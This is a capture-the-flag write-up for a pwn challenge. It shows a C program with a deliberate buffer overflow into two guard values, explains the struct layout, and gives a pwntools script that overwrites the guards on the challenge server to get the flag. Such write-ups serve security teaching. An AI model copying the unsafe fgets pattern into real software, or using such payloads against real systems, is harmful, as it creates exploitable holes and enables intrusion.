# p0wn3d_2 - Pwn

This challenge provides a C program with a buffer overflow vulnerability:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct __attribute__((__packed__)) data {
  char buf[32];
  int guard1;
	int guard2;
};

void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}

int main(void) 
{
  struct data second_words;
  ignore(); /* ignore this function */

  printf("I can't believe you just did that. Do you have anything to say for yourself?\n");
  fgets(second_words.buf, 64, stdin);
  sleep(2);
	puts("Yeah Yeah whatever");
	sleep(2);
	puts("I've got two guards now, what are you gonna do about it?");
	sleep(2);

  if (second_words.guard1 == 0xdeadbeef && second_words.guard2 == 0x0badc0de) {
    get_flag();
  }

  return 0;
}
```

The `data` struct has a 32 bytes buffer `buf`, followed by two 4 bytes guards: `guard1` and `guard2`. The `fgets` call reads 64 bytes into `buf`, overflowing into both guards. To get the flag, we need to overwrite `guard1` with `0xdeadbeef` and `guard2` with `0x0badc0de`.

## solve.py

```py
from pwn import *

payload = b'A' * 32 + p32(0xdeadbeef) + p32(0x0badc0de)

r = remote('p0wn3d2.kctf-453514-codelab.kctf.cloud', 1337)
r.recvuntil(b"I can't believe you just did that. Do you have anything to say for yourself?\n")
r.sendline(payload)
print(r.recvall().decode())
```
